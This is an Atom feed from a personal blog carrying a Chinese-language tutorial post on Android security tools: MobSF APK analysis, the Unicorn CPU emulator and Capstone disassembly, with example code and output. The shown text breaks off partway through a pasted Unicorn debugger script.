<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>v5le0n9&#39;s garden</title>
  
  <subtitle>小凉的秘密基地</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-07-28T14:36:34.093Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>v5le0n9</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android移动安全相关工具</title>
    <link href="http://example.com/posts/78ecec07.html"/>
    <id>http://example.com/posts/78ecec07.html</id>
    <published>2022-07-28T14:18:08.225Z</published>
    <updated>2022-07-28T14:36:34.093Z</updated>
    
    <content type="html"><![CDATA[<p>没想到吧，我又润来学安卓了。。。实习就是这样的啦，多点尝试。</p><span id="more"></span><h1 id="1-MobSF"><a href="#1-MobSF" class="headerlink" title="1. MobSF"></a>1. MobSF</h1><p>MobSF是Mobile Security Framework的缩写，是一个移动端应用安全问题检测的框架和工具，它适用于Android/iOS/Windows，能够执行动态和静态的恶意软件的分析和检测，无论是二进制方式还是压缩的源代码都可以进行检测。静态分析适用于安卓、苹果应用程序，而动态分析暂时只支持安卓应用程序。</p><p>详细安装教程可看官方文档：<a href="https://mobsf.github.io/docs/#/zh-cn/">https://mobsf.github.io/docs/#/zh-cn/</a></p><p>注：Python版本按照上面官方文档下载，安装Python 3.10会出错。</p><p>将APK文件（比如：迅雷安卓移动端）上传到MobSF，并等待它自动分析。分析完成后MobSF后界面如下：</p><img src="/posts/78ecec07/1.1.1.jpg" class="" title="MobSF静态分析界面"><h2 id="1-1-基本信息"><a href="#1-1-基本信息" class="headerlink" title="1.1 基本信息"></a>1.1 基本信息</h2><p>在基本信息那一栏，可以看到该APK的安全得分、文件信息和App信息等。App信息包括了包名和Main Activity等。基本信息中还会给出Activities、Services、Receivers、Providers这四大组件的数目，以及可导出组件的数目。（可导出组件是较为严重的安全漏洞，因此这里单独列出了可导出组件的数目）</p><img src="/posts/78ecec07/1.1.2.jpg" class="" title="基本信息"><h2 id="1-2-扫描信息和反编译代码"><a href="#1-2-扫描信息和反编译代码" class="headerlink" title="1.2 扫描信息和反编译代码"></a>1.2 扫描信息和反编译代码</h2><img src="/posts/78ecec07/1.1.3.jpg" class="" title="扫描信息"><p>可以对APK进行重扫，也可以开始动态分析。动态分析就需要Genymotion模拟器或者真机辅助。点击动态分析，MobSF会将该APK下载至安卓设备中，但目前的APK和真机大多是ARM架构的，所以下载至真机应该没多大问题。但Genymotion是x86架构的，下载ARM架构的APK会导致下载失败。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ERROR] 26/Jul/2022 15:19:56 - This APK cannot be installed. Is this APK compatible the Android VM/Emulator?</span><br><span class="line">adb install failed</span><br><span class="line">[ERROR] 26/Jul/2022 15:19:56 - Internal Server Error: /android_dynamic/d165c0577f92a5ea85d964d853c6e15d</span><br><span class="line">ERROR:django.request:Internal Server Error: /android_dynamic/d165c0577f92a5ea85d964d853c6e15d</span><br></pre></td></tr></table></figure><p>解决方法是下载安装转换工具<a href="https://github.com/m9rco/Genymotion_ARM_Translation">Genymotion_ARM_Translation</a>，目前只更新到Android 9.0，所以使用的模拟器安卓版本不能太高。据自己的模拟器系统版本下载对应的ZIP包，然后将包直接拖入到模拟器安装，安装完成后重启模拟器即可。</p><p>在MobSF中连接安卓设备，重新选择动态分析，此时成功下载迅雷，进入动态调试界面。</p><img src="/posts/78ecec07/1.1.4.jpg" class="" title="动态分析"><p>同时在Dynamic Analyzer那一栏可以看到APK在模拟器中的安装路径。</p><img src="/posts/78ecec07/1.1.5.jpg" class="" title="动态分析"><p>呃动态分析好像也是MobSF自动分析的。动态分析主要功能如下：</p><div class="table-container"><table><thead><tr><th>功能菜单</th><th>说明</th></tr></thead><tbody><tr><td>Show/Stop Screen</td><td>开启/关闭屏幕</td></tr><tr><td>Install/Remove MobSF RootCA</td><td>安装/卸载MobSF证书</td></tr><tr><td>Set/Unset HTTP(s) Proxy</td><td>设置/取消HTTP(s)代理</td></tr><tr><td>TLS/SSL Security Tester</td><td>TLS/SSL安全测试</td></tr><tr><td>Exported Activity Tester</td><td>测试导出类型的Activity</td></tr><tr><td>Activity Tester</td><td>测试Activity</td></tr><tr><td>Get Dependencies</td><td>获取依赖项</td></tr><tr><td>Take a Screenshot</td><td>截屏</td></tr><tr><td>Logcat Stream</td><td>日志流信息</td></tr><tr><td>Generate Report</td><td>生成动态分析报告</td></tr></tbody></table></div><p>如果APK比较大，在Activity Tester测试时等待时间会比较漫长。</p><p>在反编译代码那一个框里可以查看并下载App的Java代码，或者查看并下载Smali代码，再或者查看Manifest文件。另外，在这部分中也可以动态分析。</p><h2 id="1-3-签名者证书"><a href="#1-3-签名者证书" class="headerlink" title="1.3 签名者证书"></a>1.3 签名者证书</h2><p>这部分主要说明了对该APK签名的签名者信息。</p><img src="/posts/78ecec07/1.1.6.jpg" class="" title="签名者信息"><h2 id="1-4-权限信息"><a href="#1-4-权限信息" class="headerlink" title="1.4 权限信息"></a>1.4 权限信息</h2><p>在权限信息中，罗列了被检测App在Manifest文件中申请的所有权限，并标出了每个权限的危险指数，对于有安全隐患的权限标记为危险。在每个权限后面都加上了该权限的作用简介，并对其功能及安全风险进行了描述。</p><img src="/posts/78ecec07/1.1.7.jpg" class="" title="权限信息"><p>以android.permission.ACCESS_COARSE_LOCATION为例：</p><p>MobSF检测到App请求了这一权限，这项权限用于获取设备的粗略位置信息。MobSF将其标记为dangerous，即认为这项权限是有安全风险的。在描述中介绍了这一权限的功能，可以通过基站定位等方式获取用户位置，恶意程序可以通过该权限来获取用户的大致位置。</p><h2 id="1-5-安卓API"><a href="#1-5-安卓API" class="headerlink" title="1.5 安卓API"></a>1.5 安卓API</h2><img src="/posts/78ecec07/1.1.8.jpg" class="" title="安卓API"><p>上传为安卓应用时展示，列举了被检测App调用的所有安卓API，并给出了调用API的代码的位置，这一功能在代码研究分析时比较实用，但在安全检测分析中实际作用并不大。</p><h2 id="1-6-Browsable-Activities"><a href="#1-6-Browsable-Activities" class="headerlink" title="1.6 Browsable Activities"></a>1.6 Browsable Activities</h2><p>browsable的意思就是浏览器在特定条件下可以打开用户的activity。（这个不太懂）</p><h2 id="1-7-安全分析"><a href="#1-7-安全分析" class="headerlink" title="1.7 安全分析"></a>1.7 安全分析</h2><p>安全分析是MobSF的最重要部分，分为六个分析点，分别是网络安全、Manifest分析、源码分析、二进制分析、NIAP分析和文件分析。</p><img src="/posts/78ecec07/1.1.9.jpg" class="" title="安全分析"><h1 id="2-Unicorn"><a href="#2-Unicorn" class="headerlink" title="2. Unicorn"></a>2. Unicorn</h1><p>Unicorn基于qemu开发，是一个轻量级、多平台、多架构的CPU模拟器框架，可以跨平台执行Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64)等指令集的原生程序，让我们更好地关注CPU操作，忽略机器设备的差异。</p><p>Unicorn安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install unicorn</span><br></pre></td></tr></table></figure><h2 id="2-1-Unicorn的编写"><a href="#2-1-Unicorn的编写" class="headerlink" title="2.1 Unicorn的编写"></a>2.1 Unicorn的编写</h2><p>对于利用Unicorn编写的代码思路一般为：设置好参数-&gt;加载模拟的代码-&gt;添加hook-&gt;run。</p><h3 id="2-1-1-设置参数并加载模拟执行的代码"><a href="#2-1-1-设置参数并加载模拟执行的代码" class="headerlink" title="2.1.1 设置参数并加载模拟执行的代码"></a>2.1.1 设置参数并加载模拟执行的代码</h3><p>头文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *<span class="comment">#调用unicorn库</span></span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *<span class="comment">#我们构造的是x86寄存器，所以还需要使用一些x86寄存器的常量，所以还要调用这个库，同理如果是x64的话就改成unicorn.x64_const</span></span><br></pre></td></tr></table></figure><p>Uc类初始化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mu = Uc(arch, mode)</span></span><br><span class="line"><span class="comment">#这个Uc类接受两个参数分别是硬件架构(arch)和硬件模式(mode)，在这个样例中我们选用的是X86体系结构和32位代码</span></span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_32)</span><br></pre></td></tr></table></figure><p>arch和mode相关常量有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arch:UC_ARCH_ARM、UC_ARCH_ARM64、UC_ARCH_M68K、UC_ARCH_MAX、UC_ARCH_MIPS、UC_ARCH_PPC、UC_ARCH_SPARC、UC_ARCH_X86</span><br><span class="line"></span><br><span class="line">mode:UC_MODE_16、UC_MODE_32、UC_MODE_64、UC_MODE_ARM、UC_MODE_BIG_ENDIAN、UC_MODE_LITTLE_ENDIAN、UC_MODE_MCLASS、UC_MODE_MICRO、UC_MODE_MIPS3、UC_MODE_MIPS32、UC_MODE_MIPS32R6、UC_MODE_MIPS64、UC_MODE_PPC32、UC_MODE_PPC64、UC_MODE_QPX、UC_MODE_SPARC32、UC_MODE_SPARC64、UC_MODE_THUMB、UC_MODE_V8、UC_MODE_V9</span><br></pre></td></tr></table></figure><p>定义虚拟地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADDRESS = <span class="number">0x1000000</span><span class="comment">#注意一定要与0x1000对齐</span></span><br></pre></td></tr></table></figure><p>映射代码内存，所有CPU操作都只能访问此内存，默认权限为rwx。<code>mem_map()</code>函数要求 address 和 size 参数都与0x1000对齐，否则会报UC_ERR_ARG异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu.mem_map(ADDRESS, <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>)<span class="comment">#接受两个参数，分别是地址和大小，要注意地址与大小一定都要是0x1000对齐</span></span><br></pre></td></tr></table></figure><p>把要模拟的代码加载到我们刚刚映射的内存上，<code>mem_write()</code>函数的第二个参数只支持python的byte数组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这个有两种实现方式第一种是直接把调试代码写在此代码中，还有一种就是调用此代码外的二进制代码</span></span><br><span class="line"><span class="comment">#第一种:</span></span><br><span class="line">x86_CODE = <span class="string">b&#x27;\x41\x4a&#x27;</span><span class="comment">#这两个x86的指令为“INC ecx”（+1指令）和“DEC edx”（-1指令）</span></span><br><span class="line">mu.mem_write(ADDRESS, x86_CODE)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二种:</span></span><br><span class="line">mu.mem_write(ADDRESS, <span class="built_in">open</span>(<span class="string">&#x27;./test&#x27;</span>).read())</span><br></pre></td></tr></table></figure><h3 id="2-1-2-添加指令级的Hook"><a href="#2-1-2-添加指令级的Hook" class="headerlink" title="2.1.2 添加指令级的Hook"></a>2.1.2 添加指令级的Hook</h3><p>这个有点像单步调试的感觉，在begin…end范围内的每一条指令被执行前都会调用callback。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=ADDRESS)</span><br></pre></td></tr></table></figure><p><code>hook_code()</code>是Python自带的函数，类似于C语言中的<code>printf()</code>。<code>hook_code()</code>用来跟踪指令的，仅打印指令执行的地址和长度信息。实际应用中可配合capstone反汇编引擎玩一些更骚的操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># callback for tracing instructions</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">uc, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot;</span> %(address, size))</span><br></pre></td></tr></table></figure><p><code>UC_HOOK_CODE</code>的callback中可以修改PC或EIP等寄存器来改变程序运行流程。实际上，Unicorn调试器的单步调试就是以这个为基础实现的。</p><h3 id="2-1-3-启动虚拟机"><a href="#2-1-3-启动虚拟机" class="headerlink" title="2.1.3 启动虚拟机"></a>2.1.3 启动虚拟机</h3><p>我们已经映射内存并将数据写入到内存，并设置好执行Hook以监视指令是否正常执行，但是虚拟机还没有启动，所以需要用<code>emu_start()</code>函数来启动虚拟机。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(x86_CODE))</span><br><span class="line"><span class="comment">#这个函数本来是有四个参数的，分别是需要模拟代码的初始地址、结束地址、模拟的时间、模拟的指令数量，我们通常忽略后面两个参数，这样就会在无限的时间中模拟无限数量的指令</span></span><br><span class="line"><span class="comment">#mu.emu_start(self, begin, until, timeout=0, count=0)</span></span><br></pre></td></tr></table></figure><h3 id="2-1-4-获取和修改寄存器内容"><a href="#2-1-4-获取和修改寄存器内容" class="headerlink" title="2.1.4 获取和修改寄存器内容"></a>2.1.4 获取和修改寄存器内容</h3><p>当然对于调试，最重要的就是可以查看和修改寄存器的值，Unicorn也提供了这样的功能：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mu.reg_write(UC_X86_REG_ECX, <span class="number">0x1234</span>)</span><br><span class="line">mu.reg_write(UC_X86_REG_EDX, <span class="number">0x7890</span>)</span><br><span class="line"><span class="comment">#这个函数接受两个参数，分别是寄存器地址（这个在常量中有）、要写入的内容</span></span><br><span class="line">r_ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">r_edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line"><span class="comment">#这个函数只接受一个参数，那就是寄存器地址，返回这个寄存器的内容</span></span><br></pre></td></tr></table></figure><h3 id="2-1-5-上述样例的完整代码"><a href="#2-1-5-上述样例的完整代码" class="headerlink" title="2.1.5 上述样例的完整代码"></a>2.1.5 上述样例的完整代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">uc, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot;</span> %(address, size))</span><br><span class="line">    </span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_32)</span><br><span class="line">ADDRESS = <span class="number">0x1000000</span></span><br><span class="line">mu.mem_map(ADDRESS, <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">x86_CODE = <span class="string">b&#x27;\x41\x4a&#x27;</span></span><br><span class="line">r_ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">r_edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; ecx:&#x27;</span>, r_ecx)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; edx:&#x27;</span>, r_edx)</span><br><span class="line">mu.reg_write(UC_X86_REG_ECX, <span class="number">0x1234</span>)</span><br><span class="line">mu.reg_write(UC_X86_REG_EDX, <span class="number">0x7890</span>)</span><br><span class="line">r_ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">r_edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; ecx:&#x27;</span>, r_ecx)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; edx:&#x27;</span>, r_edx)</span><br><span class="line">mu.mem_write(ADDRESS, x86_CODE)</span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code, begin=ADDRESS, end=ADDRESS)</span><br><span class="line">mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(x86_CODE))</span><br><span class="line">r_ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">r_edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; ecx:&#x27;</span>, r_ecx)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; edx:&#x27;</span>, r_edx)</span><br></pre></td></tr></table></figure><p>运行试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\v5le0n9\Desktop&gt; python unicorn.py</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;unicorn.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    from unicorn import *</span><br><span class="line">  File &quot;C:\Users\v5le0n9\Desktop\unicorn.py&quot;, line 2, in &lt;module&gt;</span><br><span class="line">    from unicorn.x86_const import *</span><br><span class="line">ModuleNotFoundError: No module named &#x27;unicorn.x86_const&#x27;; &#x27;unicorn&#x27; is not a package</span><br><span class="line">PS C:\Users\v5le0n9\Desktop&gt;</span><br></pre></td></tr></table></figure><p>运行错误，这里是一个点，不能将测试文件命名为<code>unicorn.py</code>，因为Unicorn模块中就有一个PY文件叫<code>unicorn.py</code>，导致文件冲突。此时应该修改测试文件名，再次运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9\Desktop&gt;python unicorn_test.py</span><br><span class="line">&gt;&gt;&gt; ecx: 0</span><br><span class="line">&gt;&gt;&gt; edx: 0</span><br><span class="line">&gt;&gt;&gt; ecx: 4660</span><br><span class="line">&gt;&gt;&gt; edx: 30864</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x1000000, instruction size = 0x1</span><br><span class="line">&gt;&gt;&gt; ecx: 4661</span><br><span class="line">&gt;&gt;&gt; edx: 30863</span><br></pre></td></tr></table></figure><h2 id="2-2-Capstone反汇编"><a href="#2-2-Capstone反汇编" class="headerlink" title="2.2 Capstone反汇编"></a>2.2 Capstone反汇编</h2><p>Unicorn 并没有反汇编功能，虽然它的内部一定有与反汇编相关的代码。我们只能自己想办法反汇编。Unicorn 有一个兄弟，它叫Capstone。Capstone是一款支持多种处理器和开发语言的反汇编框架。我将使用Capstone 作为调试模块的反汇编器。</p><p>Capstone安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install capstone</span><br></pre></td></tr></table></figure><h3 id="2-2-1-Capstone例子"><a href="#2-2-1-Capstone例子" class="headerlink" title="2.2.1 Capstone例子"></a>2.2.1 Capstone例子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone.arm <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">CODE = <span class="string">b&quot;\xf1\x02\x03\x0e\x00\x00\xa0\xe3\x02\x30\xc1\xe7\x00\x00\x53\xe3&quot;</span></span><br><span class="line"> </span><br><span class="line">md = Cs(CS_ARCH_ARM, CS_MODE_ARM)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9\Desktop&gt;python capstone_test.py</span><br><span class="line">1000:   mcreq   p2, #0, r0, c3, c1, #7</span><br><span class="line">1004:   mov     r0, #0</span><br><span class="line">1008:   strb    r3, [r1, r2]</span><br><span class="line">100c:   cmp     r3, #0</span><br></pre></td></tr></table></figure><h3 id="2-2-2-UnicornDebbuger调试器"><a href="#2-2-2-UnicornDebbuger调试器" class="headerlink" title="2.2.2 UnicornDebbuger调试器"></a>2.2.2 UnicornDebbuger调试器</h3><p>无名大佬写的调试器，直接拿来用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> arm_const</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">import</span> capstone <span class="keyword">as</span> cp</span><br><span class="line"> </span><br><span class="line">BPT_EXECUTE = <span class="number">1</span></span><br><span class="line">BPT_MEMREAD = <span class="number">2</span></span><br><span class="line">UDBG_MODE_ALL = <span class="number">1</span></span><br><span class="line">UDBG_MODE_FAST = <span 